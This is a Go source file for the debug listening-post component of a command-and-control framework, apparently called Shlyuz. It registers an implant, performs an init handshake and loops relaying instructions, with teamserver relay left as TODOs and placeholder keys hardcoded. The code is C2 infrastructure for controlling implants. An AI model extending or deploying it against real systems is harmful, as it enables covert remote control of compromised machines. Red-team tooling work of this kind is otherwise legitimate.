//go:build lp && (!implant || !teamserver)

package main

import (
	"log"
	"sync"
	"time"

	// "shlyuz/pkg/crypto/asymmetric"
	"shlyuz/pkg/transport"

	"shlyuz/pkg/component"
	"shlyuz/pkg/config/lpconfig"
	"shlyuz/pkg/transaction"
	"shlyuz/pkg/utils/idgen"
	"shlyuz/pkg/utils/logging"
	"shlyuz/pkg/utils/uname"
)

func makeManifest(componentId string) component.ComponentManifest {
	var generatedManifest component.ComponentManifest
	platInfo := uname.GetUname()
	generatedManifest.Hostname = platInfo.Uname.Nodename
	generatedManifest.Id = componentId
	generatedManifest.Os = platInfo.Uname.Sysname
	return generatedManifest
}

func genComponentInfo(lpConfig []byte) component.Component {
	var Component component.Component
	parsedConfig := lpconfig.ParseConfig(lpConfig)
	log.SetPrefix(logging.GetLogPrefix())
	log.Println("Started Shlyuz Debug LP")
	Component.CurrentKeypair = parsedConfig.CryptoConfig.CompKeyPair
	Component.InitalKeypair = Component.CurrentKeypair
	Component.Config = parsedConfig
	Component.ComponentId = Component.Config.Id
	Component.ConfigKey = Component.Config.CryptoConfig.SymKey
	Component.Manifest = makeManifest(Component.ComponentId)

	return Component
}

func registerClient(Component *component.Component) transport.RegisteredComponent {
	var client transport.RegisteredComponent
	var err error
	client.Transport, _, err = transport.PrepareTransport(Component, []string{})
	if err != nil {
		log.Fatalln("transport failed to initalize: ", err)
	}

	client.InitalKeyPair = Component.InitalKeypair
	client.InitalPubKey = Component.Config.CryptoConfig.PeerPk // find a better way to do this
	client.CurKeyPair = client.InitalKeyPair
	client.CurPubKey = client.InitalPubKey
	client.XorKey = Component.Config.CryptoConfig.XorKey
	client.TskChkTimer = Component.Config.TskChkTimer
	client.InitSignature = Component.Config.InitSignature
	client.SelfComponentId = Component.ComponentId

	initAckInstruction, client, boolSuccess := transaction.RetrieveInitFrame(&client)
	if !boolSuccess {
		log.Println("implant failed to initalize")
		// TODO: Restart loop here
	}
	transaction.RelayInitFrame(&client, initAckInstruction)
	log.Println(client)

	return client
}

func clientLoop(client *transport.RegisteredComponent) {
	for {
		instructionRequestFrame, err := transaction.RetrieveInstructionRequest(client) // Depending if we have something in the Queue for this implant, we'll relay an instruction. This should go to a router of some srot
		if err != nil {
			log.Println("invalid instruction received: ")
			log.Println("[dbginstructframe]: ", instructionRequestFrame)
			log.Println(err)
			time.Sleep(time.Duration(client.TskChkTimer))
			break
		}
		// go transaction.RouteClientInstruction(client, instructionRequestFrame)
		transaction.RouteClientInstruction(client, instructionRequestFrame)
		// TODO: Teamserver interaction function
		// serverCmd := transaction.RelayInstructionToServer
		// serverCmd will not empty (no-op if no command), we will run transaction.GenerateForwardCmd
		// instructionReplyFrame, clientKp := transaction.GenerateForwardCmd(client)
		// transaction.RelayForwardCmd(client, instructionReplyFrame)
		time.Sleep(time.Duration(client.TskChkTimer))
		// break
	}
}

func main() {
	var clients []transport.RegisteredComponent
	log.SetPrefix(logging.GetLogPrefix())
	// TODO: make this real
	lpConfig :=
		[]byte(`[lp]
id = ` + idgen.GenerateComponentId() + `
transport_name = file_transport
task_check_time = 60
init_signature = b'\xde\xad\xf0\r'
` + `
[crypto]
imp_pk = 4b6d9dgg877lg3231n1gjbn2dgjb79g0gbb77998gggg668866468g334nlb820g
sym_key = BvjTA1o55UmZnuTy
xor_key = 0x6d
priv_key = jnbl37d67g656d617b19l6l02305g68l4d03ngn914800934511b2g13bgdg1021`)
	Component := genComponentInfo(lpConfig)
	// This is the start of the registration process for a client

	// TODO: In a for loop for every expected client, run a goroutine, append to clients
	// client := go registerClient(&Component)
	client := registerClient(&Component) // TODO: Be concurrent, call runclient inside this goroutine
	clients = append(clients, client)    // TODO: Put me inside the concurrent goroutine

	wg := sync.WaitGroup{}
	//  as an LP, we are awaiting a request for a command from an implant, which is then relayed to TS, where we get a command etc
	for index, registeredClient := range clients {
		log.Println("Registered ", index, "clients")
		log.Println("Starting execution for ", registeredClient.Id)
		go clientLoop(&registeredClient)
	}
	wg.Wait()

	for {
		select {}
	} //run forever

}
